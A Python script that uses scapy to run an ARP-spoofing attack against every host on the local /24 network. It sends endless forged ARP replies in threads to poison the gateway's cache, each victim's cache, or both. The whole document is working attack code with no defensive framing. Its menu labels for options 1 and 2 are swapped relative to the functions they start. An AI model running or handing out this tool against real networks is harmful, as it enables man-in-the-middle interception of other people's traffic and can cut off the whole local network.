import threading
import ipaddress
import sys
from scapy.all import Ether, ARP, sendp, conf, get_if_hwaddr, get_if_addr


interface = conf.iface
attacker_mac = get_if_hwaddr(interface)
local_ip = get_if_addr(interface)

def get_default_gateway():
    return conf.route.route("0.0.0.0")[2]

gateway_ip = get_default_gateway()

def get_ip_network():
    return ipaddress.ip_network(local_ip + '/24', strict=False)

def spoof_route(victim_ip):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
    arp = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=attacker_mac)
    packet = ether / arp
    while True:
        sendp(packet, iface=interface, verbose=False)

def spoof_host(victim_ip):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
    arp = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=attacker_mac)
    packet = ether / arp
    while True:
        sendp(packet, iface=interface, verbose=False)

def start_threads(target_func, hosts):
    for ip in hosts:
        if ip == local_ip or ip == gateway_ip:
            continue
        t = threading.Thread(target=target_func, args=(ip,))
        t.daemon = True
        t.start()

def main():
    print(f"local_ip: {local_ip}")
    print(f"gateway_ip: {gateway_ip}")
    print(f"interface: {interface}")
    print("Please select mode:")
    print("  1) Spoof Route")
    print("  2) Spoof Host")
    print("  3) Mixed Mode")
    choice = input("Enter a number [1/2/3]:").strip()

    hosts = [str(ip) for ip in get_ip_network().hosts()]

    if choice == '1':
        print("start spoof_host!!!") 
        start_threads(spoof_host, hosts)
    elif choice == '2':
        print("start spoof_route!!!")
        start_threads(spoof_route, hosts)
    elif choice == '3':
        print("start Mixed Mode!!!")
        start_threads(spoof_host, hosts)
        start_threads(spoof_route, hosts)
    else:
        print("Error")
        sys.exit(1)
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("stop")

if __name__ == "__main__":
    main()
